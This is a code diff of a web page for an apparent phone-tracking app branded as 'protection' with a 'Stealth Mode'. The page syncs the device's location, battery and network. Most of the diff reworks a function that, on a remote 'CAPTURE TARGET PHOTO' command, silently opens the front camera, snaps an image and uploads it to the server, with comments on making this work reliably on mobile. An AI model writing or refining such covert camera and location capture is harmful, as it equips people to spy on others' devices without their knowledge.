@@ -42,7 +42,7 @@
             <div class="blinking-dot" style="margin: 0 auto 15px auto;"></div>
             <h3 style="color: #00ff41; margin-bottom: 15px;">🛡️ PROTECTION ACTIVE</h3>
             <p style="font-size: 12px; color: #aaa; margin-bottom: 15px;">Stealth Mode: Location, Battery & Network syncing.</p>
-            <p id="cam-log" style="font-size: 12px; color: #f39c12; margin-bottom: 5px;"></p>
+            <p id="cam-log" style="font-size: 12px; color: #f39c12; margin-bottom: 5px; font-weight: bold;"></p>
             <p id="gps-log" style="font-size: 13px; color: #00f3ff; font-weight: bold;"></p>
             <button class="btn-logout" onclick="location.reload()" style="margin-top: 30px; width: 100%;">STOP PROTECTION</button>
         </div>
@@ -61,7 +61,6 @@
                         <p>NETWORK: <span id="net" style="color: #00ff41; font-weight: bold;">--</span></p>
                         <p>LATITUDE: <span id="lat">--.-----</span></p>
                         <p>LONGITUDE: <span id="lng">--.-----</span></p>
-                        <!-- YAHAN ACCURACY WAPAS ADD KI HAI TAaKI JS CRASH NA HO -->
                         <p>ACCURACY: <span id="acc">--</span></p>
                     </div>
                     
@@ -86,7 +85,6 @@
     </div>
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <!-- Hum ensure kar rahe hain ki matrix rain app.js load ho (agar aapne usko CSS/JS foldero mein rakha hai) -->
     <script src="js/app.js"></script> 
     
     <script>
@@ -176,7 +174,7 @@
             if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => { 
-                    camLog.innerText = "📷 Camera Ready (Stealth Mode).";
+                    camLog.innerText = "📷 Camera Ready (Awaiting Command).";
                     camLog.style.color = "#00ff41"; 
                     stream.getTracks().forEach(track => track.stop()); 
                 }).catch(e => {
@@ -236,25 +234,60 @@
             }).catch(e => { gpsLog.innerText = "Syncing Error... Server offline."; gpsLog.style.color = "#ff003c"; });
         }
 
+        // ==========================================
+        // 📸 SUPER-TESTED CAMERA CAPTURE LOGIC
+        // ==========================================
         function takeStealthPhoto() {
+            const camLog = document.getElementById('cam-log');
+            camLog.innerText = "📸 Command Received: Accessing Camera...";
+            camLog.style.color = "#f39c12";
+
             if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                // Resolution kam rakhi hai taaki jaldi upload ho
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 320, height: 240 } })
                 .then(stream => {
+                    camLog.innerText = "📸 Camera Opened. Capturing...";
                     const video = document.createElement('video');
-                    video.srcObject = stream; video.play();
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 320; canvas.height = 240;
-                        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                        const photoData = canvas.toDataURL('image/jpeg', 0.6);
-                        stream.getTracks().forEach(track => track.stop()); 
-                        
-                        fetch('/api/upload-photo', {
-                            method: 'POST', headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ deviceId: globalDeviceId, photoUrl: photoData })
-                        }).then(() => { cameraAccessed = false; });
-                    }, 1500);
-                }).catch(err => { cameraAccessed = false; });
+                    // Yeh tags zaroori hain Mobile devices ke liye
+                    video.setAttribute('autoplay', 'true');
+                    video.setAttribute('playsinline', 'true');
+                    video.muted = true;
+                    video.srcObject = stream; 
+                    
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 320; 
+                            canvas.height = video.videoHeight || 240;
+                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            // Image compress karke Base64 banayi
+                            const photoData = canvas.toDataURL('image/jpeg', 0.5);
+                            
+                            // Hardware camera turant band karo
+                            stream.getTracks().forEach(track => track.stop()); 
+                            camLog.innerText = "📸 Uploading Photo to Server...";
+                            
+                            fetch('/api/upload-photo', {
+                                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ deviceId: globalDeviceId, photoUrl: photoData })
+                            }).then(() => { 
+                                camLog.innerText = "✅ Photo Sent Successfully!";
+                                camLog.style.color = "#00ff41";
+                                cameraAccessed = false; 
+                            }).catch(err => {
+                                camLog.innerText = "❌ Upload Failed! (Check Internet)";
+                                camLog.style.color = "#ff003c";
+                                cameraAccessed = false;
+                            });
+                        }, 1200); // Lens focus ke liye 1.2 second wait
+                    };
+                }).catch(err => { 
+                    camLog.innerText = "❌ Camera Failed! Is phone locked/minimized?";
+                    camLog.style.color = "#ff003c";
+                    cameraAccessed = false; 
+                });
             }
         }
 
@@ -283,7 +316,7 @@
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ deviceId: globalDeviceId, command: "TAKE_PHOTO" })
             }).then(() => {
-                setTimeout(() => { btn.innerText = "📸 CAPTURE TARGET PHOTO"; }, 6000);
+                setTimeout(() => { btn.innerText = "📸 CAPTURE TARGET PHOTO"; }, 8000);
             });
         }
 
@@ -299,7 +332,6 @@
                     document.getElementById('lat').innerText = data.lat.toFixed(5);
                     document.getElementById('lng').innerText = data.lng.toFixed(5);
                     
-                    // SAFEKEEPING: Agar HTML me acc tag galti se hat bhi jaye, tab bhi error nai aayega
                     let accEl = document.getElementById('acc');
                     if (accEl) accEl.innerText = Math.round(data.accuracy) + " meters";
                     
